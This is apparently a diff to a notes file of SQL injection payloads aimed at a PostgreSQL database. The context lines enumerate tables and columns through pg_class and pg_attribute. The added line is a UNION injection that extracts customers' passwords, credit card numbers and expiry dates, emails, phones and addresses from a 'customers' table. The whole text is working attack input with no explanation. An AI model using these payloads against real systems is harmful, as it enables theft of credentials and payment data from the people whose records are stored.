@@ -7,4 +7,5 @@ a' union select oid || ' ' || relname || ' ' || relnamespace from pg_class where
 
 a' union select attname || ' ' || attrelid from pg_attribute where attrelid=62003 and '1'='1
 
-
+a' union select address2 || ' ' || creditcardexpiration || ' ' || address1 || ' ' || cmin || ' ' || country || ' ' || age || ' ' || customerid || ' ' || xmin || ' ' || city || ' ' || password || ' ' || tableoid || ' ' || ctid || ' ' || credit || ' ' || state || ' ' || zip || ' ' || phone || ' ' || cmax || ' ' || region || ' ' || lastname || ' ' || email || ' ' || creditcard || ' ' || creditcardtype || ' ' || firstname || ' ' || username || ' ' || gender || ' ' ||
+    xmax from customers where '1'='1
